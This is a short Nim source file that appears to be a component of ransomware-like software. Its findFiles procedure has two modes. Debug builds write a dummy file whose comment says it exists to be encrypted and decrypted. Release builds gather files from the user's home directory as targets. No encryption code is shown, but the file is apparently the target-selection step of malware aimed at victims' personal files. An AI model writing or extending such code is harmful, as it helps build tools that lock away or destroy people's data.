import std/os

when defined(debug):
  # Make a dummy file specifically to be encrypted and decrypted.
  proc findFiles*(): seq[string] =
    try:
      writeFile("dummy_file.txt", "Hello World!")
      return @["dummy_file.txt"]
    except:
      # Return nothing as a safe measure.
      return @[]
else:
  # Search *everywhere* in the user's home directory.
  proc findFiles*(): seq[string] =
    for kind, path in walkDir(dir = getHomeDir(), skipSpecial = true):
      if kind == pcFile: result.add(path)
    return result